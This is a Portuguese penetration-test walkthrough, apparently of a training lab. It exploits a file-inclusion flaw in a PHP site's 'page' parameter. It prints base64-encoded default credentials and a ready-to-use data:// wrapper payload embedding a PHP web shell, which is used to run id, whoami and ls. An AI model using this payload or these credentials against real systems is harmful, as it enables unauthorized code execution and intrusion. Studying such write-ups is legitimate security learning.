No OSINT do Site vemos q Tem a possibilidade de uma pagina com fraquezes de injeção php:
Entao vamos para essa analise de pagina:
A pagina em questao é essa:

<img width="1174" height="850" alt="image" src="https://github.com/user-attachments/assets/8e4eab61-e50f-4932-a89c-153d68a347c5" />
Na pagina em si possa existir outro tipo de injeção mas a que eu encontrei foi no URL do site:
ex: http://rh.businesscorp.com.br/index.php?page=submit

possiveis injeções do tipo LFI no site, para testarbasta apenas colocar um ls no final do =
ex: http://rh.businesscorp.com.br/?page=ls

<img width="1670" height="267" alt="image" src="https://github.com/user-attachments/assets/8d1545e8-3c03-4939-938a-efea531ff1c2" />
Esta mensagem de erro para aguns podem ser o ponto final de uma exploração mas a realidade que essa mensagem de ERRO já diz muita coisa 
    
    Warning: include(): Failed opening 'ls.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/html/index.php on line 54

teste 2:
<img width="995" height="207" alt="image" src="https://github.com/user-attachments/assets/ddd1206a-14f5-4ec6-abfd-5a8ce98cd182" />

teste 3:
<img width="987" height="173" alt="image" src="https://github.com/user-attachments/assets/44b6b4d2-7e4d-41cb-b10c-b6898e0d6810" />

Com base nesses comandos e os erros que o site retornava eu pude ir moldando o meu comando de injeção:

Podemos ver que o nosso comando executado carregou como um comando dentro do servidor, com base nas analises das lista que criei com base na vulnerabilidade da porta 22 eu vi que teve reconheciento de senha x64:
root:cm9vdA==
ftp:ZnRw 

Logo possivelmente esse LFI seja x64, Logo podemos testar algum injection x64
Data wrapper que faz essa conversão

pesquisando RCE's:

Até que cheguei nesses comandos:
# Executar 'id'
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id

<img width="1461" height="193" alt="image" src="https://github.com/user-attachments/assets/ba17d026-9e13-45e5-ac4c-1ac20da10a77" />
Executando o comando ,não é possivel ver a resposta visivelmente no site mas abrindo o F12 temos uma resposta alí mostrando que toda a leitura e analise chegaram a uma conclusão certa

# Executar 'whoami'  
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami

<img width="1096" height="194" alt="image" src="https://github.com/user-attachments/assets/c9d29a71-2c0a-489a-a182-f5e6d63bf92a" />

# Listar diretório
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls+-la

Encontrei essas que realizam comandos no sistema.

